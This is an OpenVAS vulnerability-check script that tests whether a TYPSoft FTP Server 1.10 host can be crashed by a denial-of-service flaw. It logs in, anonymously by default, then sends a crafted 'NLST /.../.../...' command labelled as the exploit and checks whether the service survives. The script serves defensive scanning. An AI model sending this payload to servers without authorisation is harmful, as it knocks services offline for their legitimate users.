###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_typsoft_ftp_server_mult_cmd_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# TYPSoft FTP Server Multiple Commands Remote Denial of Service Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to crash the affected
  application, denying service to legitimate users.
  Impact Level: Application";
tag_affected = "TYPSoft FTP Server Version 1.10";
tag_insight = "Multiple flaws are caused by an error when processing FTP commands, which
  can be exploited to crash the FTP service by sending specially crafted FTP
  commands.";
tag_solution = "No solution or patch is available as of 15th, February, 2012. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/ftpserv/";
tag_summary = "This host is running TYPSoft FTP Server and is prone to multiple
  denial of service vulnerabilities.";

if(description)
{
  script_id(802605);
  script_version("$Revision: 12 $");
  script_bugtraq_id(51891);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-02-08 12:12:12 +0530 (Wed, 08 Feb 2012)");
  script_name("TYPSoft FTP Server Multiple Commands Remote Denial of Service Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51891");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/73016");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18469");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109508/typsoftcwnslt-dos.txt");

  script_description(desc);
  script_summary("Determine if TYPSoft FTP is prone to denial of service vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl");
  script_require_ports("Services/ftp", 21);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("ftp_func.inc");

## Variable Initialization
soc = 0;
soc1 = 0;
pass = "";
user = "";
banner = "";
exploit = "";
ftpPort = 0;
login_details = "";

## Get the default port of FTP
ftpPort = get_kb_item("Services/ftp");
if(! ftpPort){
  ftpPort = 21;
}

## check port status
if(! get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application
banner = get_ftp_banner(port:ftpPort);
if(! banner || "TYPSoft FTP Server" >!< banner){
  exit(0);
}

## Open FTP Socket
soc = open_sock_tcp(ftpPort);
if(! soc){
  exit(0);
}

## Check for the user name and password
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

## Try for anomymous user
if(! user){
  user = "anonymous";
  pass = "openvas@";
}

## Try to Login
login_details = ftp_log_in(socket:soc, user:user, pass:pass);
if(! login_details){
  exit(0);
}

## Build Exploit
exploit = "NLST /.../.../.../.../.../";

## Send the Attack Request
ftp_send_cmd(socket:soc, cmd:exploit);
ftp_close(socket:soc);

## Open the socket to confirm FTP server is alive
soc1 = open_sock_tcp(ftpPort);
if(! soc1)
{
  security_warning(ftpPort);
  exit(0);
}

## Some time server will be listening, but won't respond
banner =  recv(socket:soc1, length:512);
if(! banner || "TYPSoft FTP Server" >!< banner)
{
  security_hole(ftpPort);
  exit(0);
}
ftp_close(socket:soc1);
